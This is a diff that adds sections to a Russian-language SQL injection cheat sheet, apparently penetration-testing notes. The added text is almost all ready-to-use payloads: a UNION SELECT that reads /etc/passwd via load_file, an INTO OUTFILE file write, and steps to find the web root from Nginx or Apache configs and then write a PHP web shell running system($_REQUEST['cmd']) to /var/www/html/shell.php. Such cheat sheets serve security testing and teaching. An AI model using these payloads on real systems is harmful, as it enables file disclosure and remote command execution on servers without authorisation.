@@ -121,6 +121,42 @@ session_user() - сессионый пользователь
 
 **1337 -** например, параметр id, но важно, чтобы такого значения не было в таблице (или можно использовать -1).
 
+### LFI без вывода с помощью UNION SQL Injection
+
+```
+' UNION SELECT load_file("/etc/passwd"),null,null -- -
+```
+
+### Запись в файлы с помощью UNION SQL Injection
+
+```
+' UNION SELECT NULL,NULL,'test text' into outfile /var/www/html/test.txt
+```
+
+### Reverse Shell с помощью UNION SQL Injection
+
+Находим папку сервера с помощью конфига веб-сервера.
+
+&#x20;Для **Nginx**:
+
+```
+cat /etc/nginx/sites-enabled/default
+```
+
+Для **Apache**:
+
+```
+cat /etc/apache2/sites-enabled/000-default.conf
+```
+
+Теперь записываем туда шелл:
+
+```
+1337 union select null,null,'<?php system($_REQUEST["cmd"]); ?>' into outfile '/var/www/html/shell.php' -- -
+```
+
+
+
 ## Обход фильтров
 
 ### Запрещено \[ , ' ( ) + = \ " ] + и пробел:
